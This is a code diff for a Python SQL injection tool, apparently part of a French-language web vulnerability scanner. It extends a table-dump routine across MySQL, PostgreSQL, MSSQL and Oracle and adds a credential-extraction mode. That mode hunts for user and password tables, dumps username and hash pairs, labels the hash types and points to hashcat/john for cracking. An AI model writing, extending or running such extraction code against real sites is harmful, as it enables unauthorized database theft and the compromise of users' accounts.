         if self.db_type == "MySQL":
-            # GROUP_CONCAT all rows at once (fast)
-            # Col sep: ;;  (0x3b3b), Row sep: ||  (0x7c7c)
-            parts = [f"IFNULL({c},0x4e554c4c)" for c in columns]  # IFNULL(c, 'NULL')
+            parts      = [f"IFNULL({c},0x4e554c4c)" for c in safe_cols]
             concat_row = f"CONCAT_WS(0x3b3b,{','.join(parts)})"
-            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR 0x7c7c) "
-                   f"FROM (SELECT {','.join(columns)} FROM `{table}` LIMIT {limit}) AS t_alias_")
+            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR 0x7c7c7c7c) "
+                   f"FROM (SELECT {','.join(safe_cols)} FROM `{table}` LIMIT {limit}) t__")
             raw = self.query(sql)
             if raw:
-                for row_str in raw.split("||"):
-                    parts = row_str.split(";;")
-                    if len(parts) >= len(columns):
-                        rows.append(dict(zip(columns, parts[:len(columns)])))
-                    elif any(p.strip() for p in parts):
-                        rows.append(dict(zip(columns[:len(parts)], parts)))
+                for row_str in re.split(r'\|\|\|\|', raw):
+                    parts_r = row_str.split(";;")
+                    if any(p.strip() for p in parts_r):
+                        row = dict(zip(safe_cols, [p.strip() for p in parts_r[:len(safe_cols)]]))
+                        rows.append(row)
+                        # Detect and flag hashes
+                        for col, val in row.items():
+                            htype = _identify_hash(str(val or ""))
+                            if htype:
+                                self._cb("vuln", f"🔑 Hash {htype} dans {table}.{col}: {str(val)[:60]}")
         else:
-            # Row by row
+            # Row-by-row for other DBs
             for offset in range(limit):
                 if self.db_type == "PostgreSQL":
-                    sql = f"SELECT {','.join(columns)} FROM {table} LIMIT 1 OFFSET {offset}"
+                    sql = f"SELECT {','.join(safe_cols)} FROM {table} LIMIT 1 OFFSET {offset}"
                 elif self.db_type == "MSSQL":
-                    sql = (f"SELECT TOP 1 {','.join(columns)} FROM {table} "
+                    sql = (f"SELECT TOP 1 {','.join(safe_cols)} FROM {table} "
                            f"ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
                 elif self.db_type == "Oracle":
-                    sql = (f"SELECT {','.join(columns)} FROM "
-                           f"(SELECT {','.join(columns)},ROWNUM rn__ FROM {table}) "
+                    sql = (f"SELECT {','.join(safe_cols)} FROM "
+                           f"(SELECT {','.join(safe_cols)},ROWNUM rn__ FROM {table}) "
                            f"WHERE rn__={offset+1}")
                 else:
-                    sql = f"SELECT {','.join(columns)} FROM {table} LIMIT 1 OFFSET {offset}"
+                    sql = f"SELECT {','.join(safe_cols)} FROM {table} LIMIT 1 OFFSET {offset}"
                 row_raw = self.query(sql)
                 if not row_raw:
                     break
-                rows.append(dict(zip(columns, row_raw.split("||")[:len(columns)])))
+                row = dict(zip(safe_cols, row_raw.split("||")[:len(safe_cols)]))
+                rows.append(row)
+                for col, val in row.items():
+                    htype = _identify_hash(str(val or ""))
+                    if htype:
+                        self._cb("vuln", f"🔑 Hash {htype} dans {table}.{col}: {str(val)[:60]}")
 
-        self._cb("found", f"🗄️ {len(rows)} ligne(s) extraite(s) de {table}")
+        self._cb("found", f"🗄️ {len(rows)} ligne(s) extraite(s) de '{table}'")
         return rows
 
+    # ── Smart credential extraction ───────────────────────────────────────────
+    def extract_credentials(self):
+        """
+        Pro-level: automatically find and dump credential tables.
+        Prioritizes tables/columns with user/password keywords.
+        Identifies all hash types found.
+        """
+        self._cb("info", "🔑 Extraction intelligente des identifiants...")
+        tables = self.extract_tables()
+        if not tables:
+            return {}
 
-# ─── Public API ───────────────────────────────────────────────────────────────
+        # Score and select best tables
+        cred_candidates = []
+        for t in tables:
+            tl = t.lower()
+            score = 0
+            score += 6 * sum(1 for kw in ["pass", "cred", "secret"] if kw in tl)
+            score += 4 * sum(1 for kw in ["user", "admin", "account", "auth", "login", "member"] if kw in tl)
+            score += 2 * sum(1 for kw in ["token", "key", "email"] if kw in tl)
+            if score > 0:
+                cred_candidates.append((score, t))
+
+        cred_candidates.sort(reverse=True)
+        # Always include first 3 tables if no creds found via score
+        if not cred_candidates:
+            cred_candidates = [(1, t) for t in tables[:3]]
+
+        results = {}
+        hashes_found = []
+        creds_found  = []
+
+        for _, table in cred_candidates[:6]:
+            cols = self.extract_columns(table)
+            if not cols:
+                continue
+
+            # Sort columns: password/email/username first
+            prio, other = [], []
+            for c in cols:
+                cl = c.lower()
+                if any(kw in cl for kw in ["pass", "pwd", "secret", "hash", "salt", "token"]):
+                    prio.insert(0, c)
+                elif any(kw in cl for kw in ["user", "name", "email", "login", "id"]):
+                    prio.append(c)
+                else:
+                    other.append(c)
+            dump_cols = (prio + other)[:10]
+
+            rows = self.dump_table(table, dump_cols, limit=30)
+            results[table] = {"columns": cols, "rows": rows}
+
+            for row in rows:
+                # Detect credentials pairs
+                user_val = None
+                pass_val = None
+                for col, val in row.items():
+                    cl = col.lower()
+                    if any(kw in cl for kw in ["user", "login", "email", "name"]):
+                        user_val = val
+                    if any(kw in cl for kw in ["pass", "pwd", "hash", "secret"]):
+                        pass_val = val
+
+                if user_val and pass_val:
+                    htype = _identify_hash(str(pass_val))
+                    cred_str = f"{user_val} : {str(pass_val)[:80]}"
+                    if htype:
+                        cred_str += f" [{htype}]"
+                        hashes_found.append({"user": user_val, "hash": pass_val, "type": htype, "table": table})
+                    creds_found.append({"username": user_val, "password": pass_val, "hash_type": htype, "table": table})
+                    self._cb("vuln", f"🔑 CREDENTIALS: {cred_str}")
+
+        if hashes_found:
+            self._cb("vuln", f"🚨 {len(hashes_found)} hash(s) de mot de passe trouvé(s) — crack avec hashcat/john")
+        if creds_found:
+            self._cb("vuln", f"🚨 {len(creds_found)} paire(s) identifiants extraites!")
+
+        results["_creds_summary"] = creds_found
+        results["_hashes"]        = hashes_found
+        return results
+
+
+# ─── Public API ────────────────────────────────────────────────────────────────
 
 def full_db_extraction(url, param=None, mode="enum", target_table=None,
                        method="GET", post_data=None, cookies=None,
-                       callback=None):
+                       callback=None, test_headers=False):
     """
-    Main entry point for DB extraction.
-    mode: "basic" → version+db only | "enum" → +databases+tables | "dump" → +dump sensitive tables
+    Main entry — professional SQLi detection + full data extraction.
+    mode: "basic" → version+DB | "enum" → +tables | "dump" → +dump | "creds" → smart cred extraction
     """
     def cb(t, m):
         if callback:
             callback({"type": t, "message": m})
 
     results = {
-        "injectable": False,
-        "technique":  None,
-        "db_type":    "MySQL",
-        "info":       {},
-        "databases":  [],
-        "tables":     [],
-        "columns":    {},
-        "dump":       {},
+        "injectable":      False,
+        "technique":       None,
+        "db_type":         "MySQL",
+        "info":            {},
+        "databases":       [],
+        "tables":          [],
+        "columns":         {},
+        "dump":            {},
+        "credentials":     {},
         "vulnerabilities": [],
     }
 
@@ -886,90 +1423,95 @@ def full_db_extraction(url, param=None, mode="enum", target_table=None,
         cb("warn", "🗄️ requests non disponible")
         return results
 
-    cb("info", f"🗄️ SQLi v5.0 — Analyse: {url}")
+    cb("info", f"🗄️ SQLi v6.0 — {url}")
 
     inj = SQLInjector(url, param=param, method=method,
                       post_data=post_data or {}, cookies=cookies or {},
-                      callback=callback)
+                      callback=callback, test_headers=test_headers)
 
-    # Step 1: Find injection
+    # Step 1: Find injection point
     if not inj.find_injection():
         cb("warn", "🗄️ Aucune injection SQL détectée")
         return results
 
     results["injectable"] = True
     results["db_type"]    = inj.db_type
+    results["vulnerabilities"].append({
+        "type": "sql_injection", "severity": "critical",
+        "name": f"SQL Injection ({inj.inj_method}) — param: '{inj.inj_param or inj.inj_header}'",
+        "detail": f"ctx={inj.inj_ctx} suf={inj.inj_suffix} vecteur={'header' if inj.inj_is_header else 'param'}",
+        "param": inj.inj_param or inj.inj_header,
+    })
 
-    # Step 2: Setup best technique
+    # Step 2: Detect technique
     tech = inj.setup_technique()
     if not tech:
         cb("warn", "🗄️ Injection détectée mais extraction impossible")
-        results["vulnerabilities"].append({
-            "type": "sql_injection",
-            "severity": "critical",
-            "name": f"SQL Injection dans param '{inj.inj_param}'",
-            "detail": f"ctx={inj.inj_ctx} suf={inj.inj_suffix} — extraction échouée",
-            "param": inj.inj_param,
-        })
         return results
 
     results["technique"] = tech
-    results["vulnerabilities"].append({
-        "type":     "sql_injection",
-        "severity": "critical",
-        "name":     f"SQL Injection ({tech}) — param '{inj.inj_param}'",
-        "detail":   f"DB: {inj.db_type} | ctx: {inj.inj_ctx} | suf: {inj.inj_suffix}",
-        "param":    inj.inj_param,
-    })
 
-    cb("vuln", f"🚨 SQLi confirmée! technique={tech} db={inj.db_type} param={inj.inj_param}")
+    # Step 3: Check stacked queries
+    inj.detect_stacked_queries()
 
-    # Step 3: Extract info
+    # Step 4: Extract DB info
     results["info"] = inj.extract_info()
+    # Flatten for easy access in app.py
+    results["version"]      = results["info"].get("version", "")
+    results["current_user"] = results["info"].get("user", "")
+    results["current_db"]   = results["info"].get("current_db", "")
 
     if mode == "basic":
         return results
 
-    # Step 4: Enumerate
+    # Step 5: Enumerate
     results["databases"] = inj.extract_databases()
     results["tables"]    = inj.extract_tables()
 
     if mode == "enum":
         return results
 
-    # Step 5: Dump sensitive tables
-    to_dump = []
-    if target_table:
-        to_dump = [target_table]
-    else:
+    # Step 6: Smart credential dump (creds mode)
+    if mode == "creds":
+        results["credentials"] = inj.extract_credentials()
+        cred_summary = results["credentials"].get("_creds_summary", [])
+        if cred_summary:
+            results["vulnerabilities"].append({
+                "type": "credential_exposure", "severity": "critical",
+                "name": f"Credentials exposés: {len(cred_summary)} compte(s)",
+                "detail": f"Tables: {', '.join(set(c['table'] for c in cred_summary))}",
+            })
+        return results
+
+    # Step 7: Full dump (dump mode)
+    to_dump = [target_table] if target_table else []
+    if not to_dump:
         for t in results["tables"]:
             if t.lower() in SENSITIVE_TABLES:
                 to_dump.append(t)
         if not to_dump:
-            to_dump = results["tables"][:3]
+            to_dump = results["tables"][:5]
 
-    for t in to_dump[:5]:
+    for t in to_dump[:6]:
         cols = inj.extract_columns(t)
         results["columns"][t] = cols
         if cols:
             rows = inj.dump_table(t, cols, limit=30)
             results["dump"][t] = rows
             if rows:
-                cb("vuln", f"🚨 TABLE '{t}': {len(rows)} ligne(s) extraite(s)!")
+                cb("vuln", f"🚨 '{t}': {len(rows)} ligne(s)!")
 
     return results
 
 
-# ─── Legacy compatibility ──────────────────────────────────────────────────────
+# ─── Legacy compatibility wrappers ────────────────────────────────────────────
 
 def detect_db_type(url, param=None, callback=None):
-    """Legacy: detect DB type"""
     if not HAS_REQUESTS:
         return "MySQL"
     try:
         import requests as _r
-        _r.packages.urllib3.disable_warnings()
-        parsed = urllib.parse.urlparse(url)
+        parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
         qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
         p = param or (list(qs.keys())[0] if qs else "id")
         qs[p] = (qs.get(p, "1")) + "'"
@@ -1004,6 +1546,5 @@ def dump_table(url, param, table, columns, limit=20, database=None,
 
 
 def test_sql_injection(url, param=None, method="GET", callback=None):
-    """Simple wrapper for basic scan step"""
     return full_db_extraction(url, param=param, method=method,
                               mode="basic", callback=callback)
